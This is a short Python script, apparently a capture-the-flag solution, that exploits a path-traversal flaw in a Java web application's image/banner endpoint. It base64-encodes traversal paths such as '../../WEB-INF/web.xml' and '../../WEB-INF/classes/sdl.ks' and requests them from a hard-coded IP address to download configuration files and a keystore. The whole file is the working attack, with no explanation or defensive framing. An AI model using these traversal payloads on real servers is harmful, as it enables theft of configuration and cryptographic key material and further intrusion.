import base64
import requests as req

URL = 'http://116.85.48.102:5050/image/banner/'


def get(p):
    res = req.get(URL + base64.b64encode(p))
    if res.status_code == 200:
        return res.content
    else:
        return res.status_code

if __name__ == '__main__':
    # you can only download .class .xml .ico .ks files!
    p = 'favicon.ico'
    p = '../../WEB-INF/classes/sdl.ks'
    p = '../../WEB-INF/web.xml'
    p = '../../WEB-INF/applicationContext.xml'
    r = get(p)
    print(r)
    # with open('f', 'wb') as f:
    #     f.write(r)
